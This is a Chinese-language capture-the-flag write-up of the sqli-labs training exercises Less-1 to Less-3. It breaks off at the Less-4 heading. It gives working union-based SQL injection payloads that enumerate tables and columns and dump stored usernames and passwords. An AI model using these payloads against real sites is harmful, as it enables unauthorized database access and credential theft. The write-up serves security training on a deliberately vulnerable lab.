# sqli-labs

打开网页，似乎有很多的题目，从第一题开始

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/K)GB)Y$K0]X7S9AW)_AVDY3.png?raw=true">

## Page-1

### Less-1

打开网页，什么都没有，屏幕中间提示我们输入id作为参数

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/N716C{K$9HYE_]S[R$(0(4Q.png?raw=true">

在url栏添加 `?id=1` ，页面变化

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/M]2XK[PCACJ[P~Q9}A2M$$0.png?raw=true">

下面判断注入点，输入 `?id=1 and 1=1` 成功

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/Q9B(F@X0J}BKG0TNMW86(HN.png?raw=true">

输入 `?id=1 and 1=2` 成功

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/YXK98G(2@54IV80[LNOV7`C.png?raw=true">

输入 `?id=1'` 报错

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/E89DYY@949HQLD%4$NY[1NX.png?raw=true">

输入 `?id=1' %23` 成功，确定存在注入点，字符型注入，单引号闭合

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/0UK$8ZD7AI~U2L7EJTT`@LW.png?raw=true">

*注：%23实际上是#的url编码*

然后判断字段数，屏幕上显示两个字段，我们从2个字段开始尝试，成功

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/L$ZD4__NZTM4I$AJ1D@PLNQ.png?raw=true">

3个字段成功

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/[2AL2(S$XP6X1FT}03`CK]I.png?raw=true">

4个字段报错

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/{X_H{439@%T_QZP7XFF{D}A.png?raw=true">

然后开始判断回显点

```sql
?id=0' union select 1,2,3 %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/B95A8QVSA0N@Q7M%7{495~7.png?raw=true">

确定回显点为2,3，获取数据库名

```sql
?id=0' union select 1,version(),database() %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/H9W_GS}_22[SWJN5R23{(WU.png?raw=true">

获取到数据库名为Security，查看该数据库下所有表名

```sql
?id=0' union select 1,version(),group_concat(table_name) from information_schema.tables where table_schema=database() %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/6ZC4H5_J_@R8@[F$P7A3~1N.png?raw=true">

注意到存在一个表名为users，查看其字段名

```sql
?id=0' union select 1,version(),group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/@4D)`]ZX3]L$8UBQ2O%WMAX.png?raw=true">

发现敏感词汇 `username` 和 `password` ，获取其中的值，中间用id隔开

```sql
?id=0' union select 1,version(),group_concat(username,id,password) from security.users %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/H90A2JO{XJOXV6ONEHAK~_1.png?raw=true">

获取到管理员账号密码，注入成功

### Less-2

封面和Less-1一样，先开始判断注入点，输入 `?id=1 and 1=1` ，成功

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/`5$2$@SA}Y8N1SDBUIWPCL0.png?raw=true">

输入 `?id=1 and 1=2` 无结果

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/7PMI5L94B44DS0F)073A78T.png?raw=true">

输入 `?id=1'` 报错

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/ADPA9(ET3R5O@U2FQM3{{U9.png?raw=true">

输入 `?id=1' %23` 报错，确定存在注入点，数字型注入

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/VEJ~XGGIZ_B{W)X)8PJ8}1P.png?raw=true">

下面过程和Less-1一样，省略

*注：此题注入语句为 `?id=0 <SQL Injection Statement>`* 

### Less-3

开始判断注入点，下面直接公布结论

- `?id=1 and 1=1` 成功

- `?id=1 and 1=2` 成功

- `?id=1'` 报错

- `?id=1' %23` 报错

这时仔细观察输入 `?id=1'` 时的报错信息，与Less-1相比，多了一个括号

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/DZ%DWK0PIHH}MP]N)8_FKK9.png?raw=true">

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/CWIE@{I)CMFD(6LH]SLJMU0.png?raw=true">

因此在构建语句的时候，也需要把括号考虑在内，输入 `?id=1') %23` 成功

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/[DZI}XV{9$~WU[A(2]025BX.png?raw=true">

下面过程和Less-1一样，省略

*注：此题注入语句为 `?id=0') <SQL Injection Statement> %23`* 

### Less-4

